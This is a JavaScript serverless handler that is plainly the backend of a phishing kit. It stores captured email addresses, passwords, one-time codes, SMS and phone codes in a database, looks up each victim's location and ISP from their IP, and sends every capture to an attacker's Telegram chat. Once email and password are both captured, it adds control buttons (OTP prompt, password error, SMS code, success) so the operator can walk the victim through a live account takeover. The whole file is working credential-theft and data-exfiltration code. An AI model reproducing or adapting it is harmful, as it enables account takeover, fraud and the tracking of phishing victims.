import { dbUpsert, dbSelectOne } from './_supabase.js';

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID   = process.env.TELEGRAM_CHAT_ID;

export const handler = async (event) => {
  if (event.httpMethod !== 'POST') return { statusCode: 405, body: 'Method not allowed' };

  try {
    const { type: dataType, email, data, sessionId } = JSON.parse(event.body || '{}');

    if (!dataType || !email || !sessionId) {
      return ok({ success: false, error: `Missing: type=${dataType} email=${email} sessionId=${sessionId}` });
    }

    const fieldMap = { EMAIL:'email', PASSWORD:'password', OTP:'otp', SMS_CODE:'sms_code', PHONE_CODE:'phone_code' };
    const field = fieldMap[dataType];
    if (!field) return ok({ success: false, error: `Unknown type: ${dataType}` });

    const ip  = getClientIP(event);
    const ua  = (event.headers['user-agent'] || 'Unknown').substring(0, 200);
    const loc = await getLocation(ip);

    // Upsert everything in one call — geo included on every write
    await dbUpsert('sessions', {
      id:          sessionId,
      email,
      [field]:     data,
      ip,
      country:     loc.country,
      city:        loc.city,
      region:      loc.region,
      isp:         loc.isp,
      lat:         String(loc.lat),
      lon:         String(loc.lon),
      device:      ua,
      last_update: new Date().toISOString(),
    });

    // Read back full session for cumulative data
    const s = await dbSelectOne('sessions', { id: sessionId }) || { email, [field]: data };

    const showButtons = !!(s.email && s.password);
    const msg  = buildMessage(dataType, s, ip, loc, ua);
    const sent = showButtons
      ? await sendWithButtons(msg, buildKeyboard(sessionId))
      : await sendMessage(msg);

    console.log(`send-to-telegram: type=${dataType} sent=${sent} buttons=${showButtons}`);
    return ok({ success: sent, buttonsShown: showButtons });

  } catch (e) {
    console.error('send-to-telegram error:', e.message);
    return ok({ success: false, error: e.message });
  }
};

function getClientIP(event) {
  const h = event.headers;
  return h['cf-connecting-ip'] || (h['x-forwarded-for']||'').split(',')[0].trim() || h['x-real-ip'] || 'Unknown';
}

async function getLocation(ip) {
  const def = { country:'Unknown', city:'Unknown', region:'Unknown', isp:'Unknown', lat:'0', lon:'0' };
  if (!ip || ip==='Unknown' || ip==='::1' || ip==='127.0.0.1') return def;

  try {
    const r = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,city,region,lat,lon,isp`, { signal: AbortSignal.timeout(5000) });
    const d = await r.json();
    if (d.status==='success') return { country:d.country, city:d.city, region:d.region, isp:d.isp, lat:String(d.lat), lon:String(d.lon) };
  } catch {}

  try {
    const r = await fetch(`https://ipinfo.io/${ip}/json`, { signal: AbortSignal.timeout(5000) });
    const d = await r.json();
    if (d.country) {
      const [lat='0', lon='0'] = (d.loc||'0,0').split(',');
      return { country:d.country, city:d.city||'Unknown', region:d.region||'Unknown', isp:d.org||'Unknown', lat, lon };
    }
  } catch {}

  return def;
}

function esc(s) {
  return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
}

function buildMessage(type, s, ip, loc, ua) {
  const titles = { EMAIL:'📧 New Submission', PASSWORD:'🔐 Password Captured', OTP:'🔑 OTP Captured', SMS_CODE:'💬 SMS Code Captured', PHONE_CODE:'📞 Phone Captured' };
  const ts = new Date().toISOString().replace('T',' ').split('.')[0];
  return `🔔 <b>${esc(titles[type]||'📋 Data Received')}</b>

📧 <b>Email:</b> <code>${esc(s.email||'—')}</code>
🔐 <b>Password:</b> <code>${esc(s.password||'—')}</code>
🔑 <b>OTP:</b> <code>${esc(s.otp||'—')}</code>
💬 <b>SMS Code:</b> <code>${esc(s.sms_code||'—')}</code>
📞 <b>Phone:</b> <code>${esc(s.phone_code||'—')}</code>

📍 <b>Location:</b> ${esc(`${loc.city}, ${loc.region}, ${loc.country}`)}
🗺 <b>GPS:</b> ${esc(`${loc.lat}, ${loc.lon}`)}
🌐 <b>IP:</b> ${esc(ip)}
🏢 <b>ISP:</b> ${esc(loc.isp)}
📱 <b>Device:</b> ${esc(ua.substring(0,120))}
⏰ <b>Time:</b> ${ts}`;
}

function buildKeyboard(sessionId) {
  return {
    inline_keyboard: [
      [{ text:'🔑 OTP Prompt', callback_data:`otp_${sessionId}` },     { text:'❌ Password Error', callback_data:`incorrect_${sessionId}` }],
      [{ text:'📱 SMS Code',   callback_data:`sms_${sessionId}` },      { text:'📞 Phone Number',   callback_data:`phone_${sessionId}` }],
      [{ text:'✅ Success',    callback_data:`success_${sessionId}` },  { text:'⚠️ SUA',             callback_data:`sua_${sessionId}` }],
    ],
  };
}

async function sendMessage(text) {
  try {
    const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method:'POST', headers:{'Content-Type':'application/json'},
      body: JSON.stringify({ chat_id:CHAT_ID, text, parse_mode:'HTML' }),
      signal: AbortSignal.timeout(8000),
    });
    const j = await r.json();
    if (!j.ok) console.error('Telegram error:', j.description);
    return j.ok;
  } catch(e) { console.error('sendMessage error:', e.message); return false; }
}

async function sendWithButtons(text, reply_markup) {
  try {
    const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method:'POST', headers:{'Content-Type':'application/json'},
      body: JSON.stringify({ chat_id:CHAT_ID, text, parse_mode:'HTML', reply_markup }),
      signal: AbortSignal.timeout(8000),
    });
    const j = await r.json();
    if (!j.ok) console.error('Telegram error (buttons):', j.description);
    return j.ok;
  } catch(e) { console.error('sendWithButtons error:', e.message); return false; }
}

const ok = (b) => ({ statusCode:200, headers:{'Content-Type':'application/json'}, body:JSON.stringify(b) });
